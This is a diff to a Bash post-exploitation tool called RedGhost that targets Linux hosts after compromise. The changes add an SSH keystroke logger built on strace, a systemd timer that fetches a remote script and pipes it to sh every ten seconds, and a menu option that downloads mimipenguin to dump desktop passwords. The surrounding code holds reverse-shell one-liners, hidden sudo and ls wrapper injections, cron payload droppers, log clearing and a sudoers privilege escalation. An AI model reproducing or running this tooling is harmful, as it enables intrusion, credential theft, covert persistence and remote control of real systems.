@@ -4,6 +4,7 @@ OUTPUT=/tmp/output.sh.$$
 trap "rm $OUTPUT; rm $INPUT; exit" SIGHUP SIGINT SIGTERM
 declare -A dispatch_table
 declare -a options
+filename=.$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13)
 
 payloads=(
 "nc -e /bin/bash address prt"
@@ -12,7 +13,7 @@ payloads=(
 "php -r '\$sock=fsockopen(\"address\",prt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 "ruby -rsocket -e 'f=TCPSocket.open(\"address\",prt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 "perl -e 'use Socket;\$i=\"address\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
-"curl -fsSL 'http://address/script' | sh"
+"curl -fsSL 'address' | sh"
 )
 
 display_output(){
@@ -22,6 +23,9 @@ display_output(){
 	dialog --title "${t}" --clear --msgbox "$(<$OUTPUT)" ${h} ${w}
 }
 
+function ctrl_c() {
+	return
+}
 
 prompt(){
 	local PS3="$1: "
@@ -35,6 +39,7 @@ prompt(){
 }
 
 enter(){
+	echo -e "\n"
 	read -p "Press 'Enter' to continue"
 }
 
@@ -95,7 +100,7 @@ sudowrap(){
 			shell="${shell/'prt'/$port}"
 			echo -e "function sudo(){ \n(sudo ${shell} > /dev/null 2>.1 &)\n /usr/bin/sudo \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 \n}" > $HOME/.sudo
 			echo "source ~/.sudo" >> ~/.bashrc
-			echo -e "\nsudo injection complete!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal\n"
+			echo -e "\nsudo injection complete!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal"
 			enter;;
 		[Exitexit]* ) return;;
 	esac
@@ -118,10 +123,24 @@ lswrap(){
 			encshell
 			echo -e "function ls(){ \n(echo \"${encode}\" | base64 -d | nohup bash > /dev/null 2>.1 &)\n /usr/bin/ls; rm .1; }" > $HOME/.ls
 			echo "source ~/.ls" >> ~/.bashrc
-			echo -e "\nls wrapper added!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal\n"
+			echo -e "\nls wrapper added!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal"
 			enter;;
 		[Exitexit]* ) return;;
 	esac
+}
+
+keyinject(){
+	if [ -n "$SSH_CLIENT" ] || [ -n "$SSH_TTY" ]; then
+		echo "SSH processes:"
+		ps aux | grep sshd | awk '{ print "ID: "$2" - "$11" "$12"\n" }' | grep -v 'grep\|sbin'
+		read -r -p "Enter SSH process ID to be injected: " PID
+		echo -e "Press ctrl+c to exit"
+		trap ctrl_c INT
+		strace -e trace=read -fp ${PID} 2>&1 | awk -F, '! /\\/ {print $2}'
+	else
+		echo "No SSH processes are currently running"
+		enter
+	fi
 }
 
 
@@ -140,16 +159,15 @@ cron(){
 	cmmand(){
 		echo "( crontab -l | grep -v -F \"$server\" ; echo \"$cronjob\" ) | crontab -" > command.txt
 		echo -e "\ncommand saved as command.txt\n"
-		echo -e "command:"
+		echo "command:"
 		cat command.txt
-		echo -e "\n"
 		enter
 	}
 
 
 	add2sys(){
 		( crontab -l | grep -v -F "$server" ; echo "$cronjob" ) | crontab -
-		echo -e "\nAdded cron job to crontab\n"
+		echo -e "\nAdded cron job to crontab"
 		enter
 	}
 
@@ -163,29 +181,45 @@ cron(){
 	prompt "Generate cron job payload dropper command or add cron job to this machine" options dispatch_table
 }
 
+systimer(){
+	echo -e "This function creates a systemd timer to download and execute payload"
+	read -r -p "Enter your server IP/address hosting script (example: https://www.server.com/script.sh): " server
+	sysdir=/etc/systemd/system/
+
+	build=(
+	"wget -O- ${server} | sh"
+	"[Unit]\nDescription=${filename}\n\n[Service]\nType=oneshot\nExecStart=/usr/bin/bash ${sysdir}${filename}"
+	"[Unit]\nDescription=${filename}\n\n[Timer]\nOnUnitActiveSec=10s\nOnBootSec=10s\n\n[Install]\nWantedBy=timers.target\n"
+	)
+
+	filenames=(
+	"${filename}" 
+	"${filename}.service"
+	"${filename}.timer"
+	)
+
+	for timer in "${!build[@]}"
+		do
+		echo -e ${build[timer]} > ${sysdir}${filenames[timer]}
+	done
+	systemctl daemon-reload
+	systemctl start ${filename}.timer
+}
+
 
 escalate(){
-	direct=/tmp/.$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13)
+	direct=/tmp/${filename}
 
 	conmethods(){
 		cat <<-EOF
-
 			This function attempts to:
-
 			*write "$USER ALL=(ALL) NOPASSWD: ALL" to /etc/sudoers
-
 			*make every user root
-
 			*read doas config
-
 			*exploit docker bash container exploit*
-
 			*Attempt to find suid
-
 			*get last edited files
-
 			*list all capabilities
-
 			EOF
 
 		enter
@@ -262,6 +296,17 @@ escalate(){
 	lineum(){
 		downld https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 	}
+	
+	mimipeng(){
+		if uname -a | grep "i386\|i686"; then
+				downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin_x32
+		else
+				downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin
+		fi
+		echo "Mimipenguin: A tool to dump the login/password from the current linux desktop user.."
+		echo "If the screen is blank mimipenguin did not find anything..."
+		${direct}/./mimipenguin*
+	}
 
 	
 	sudokill(){
@@ -273,17 +318,14 @@ escalate(){
 	Orc(){
 		downld https://github.com/zMarch/Orc/archive/master.zip
 		cat <<-EOF
-
 			Dropping into Orc shell!
-
 			Check https://github.com/zMarch/Orc for commands and usage.
-
 			EOF
 
 		ENV=${direct}/zip/Orc-master/o.rc sh -i
 	}
 
-	options=( "Try conventional methods to escalate privileges" "Search for password in this system" "Download and run dirty cow exploit" "Download and run linuxprivchecker.py" "Download and run linux exploit suggester" "Download and run LinEnum" "Download and run SUDO KILLER" "Download and run Orc" "Return to main menu")
+	options=( "Try conventional methods to escalate privileges" "Search for password in this system" "Download and run dirty cow exploit" "Download and run linuxprivchecker.py" "Download and run linux exploit suggester" "Download and run LinEnum" "Download and run mimipenguin" "Download and run SUDO KILLER" "Download and run Orc" "Return to main menu")
 	dispatch_table=(
 		["Try conventional methods to escalate privileges"]=conmethods
 		["Search for password in this system"]=search
@@ -291,6 +333,7 @@ escalate(){
 		["Download and run linuxprivchecker.py"]=linprivesc
 		["Download and run linux exploit suggester"]=exploitsug
 		["Download and run LinEnum"]=lineum
+		["Download and run mimipenguin"]=mimipeng
 		["Download and run SUDO KILLER"]=sudokill
 		["Download and run Orc"]=Orc
 		["Return to main menu"]=return
@@ -398,12 +441,10 @@ checkVM(){
 
 memoryexec(){
 	memexc=${payloads[6]}
-	read -r -p "Enter server IP address/host hosting bash script: " address
-	read -r -p "Enter script file name (example.sh): " script
-	memexc="${memexc/'address'/$address}"
-	memexc="${memexc/'script'/$script}"
-	echo "$memexc" | sh
-	echo -e "\nExecution of ${script} in memory completed!\n"
+	read -r -p "Enter server IP address/host hosting bash script (example: http://server.com/shell.sh): " server
+	memexc="${memexc/'address'/$server}"
+	eval "$memexc"
+	echo -e "\nExecution of ${script} in memory completed!"
 	enter
 }
 
@@ -428,14 +469,15 @@ banip(){
 
 while true
 do
-
 dialog --clear --nocancel --backtitle "\Zb\Z0Coded by d4rkst4t1c.. v2.0" \
 --colors --title "\Zb\Z0[\Zb\Z1 R E D G H O S T \Zb\Z0- \Zb\Z1P O S T  E X P L O I T \Zb\Z0- \Zb\Z1T O O L \Zb\Z0]" \
---menu "Linux post exploitation framework and payload generator." 18 60 11 \
+--menu "Linux post exploitation framework and payload generator." 20 60 13 \
 Payloads "Generate Reverse Shells" \
 SudoInject "Inject 'sudo' to run payload as root" \
 lsInject "Inject 'ls' with payload" \
+SSHKeyInject "Log ssh process keystrokes" \
 Crontab "Add cron job for persistence" \
+SysTimer "Create systemd timer for persistence" \
 GetRoot "Escalate privileges" \
 Clearlogs "Clear all logs" \
 MassinfoGrab "Gain recon on the system" \
@@ -450,7 +492,9 @@ case $menuitem in
 	Payloads) clear; genpayload;;
 	SudoInject) clear; sudowrap;;
 	lsInject) clear; lswrap;;
+	SSHKeyInject) clear; keyinject;;
 	Crontab) clear; cron;;
+	SysTimer) clear; systimer;;
 	GetRoot) clear; escalate;;
 	Clearlogs) clear; clearlog;;
 	MassinfoGrab) clear; info;;
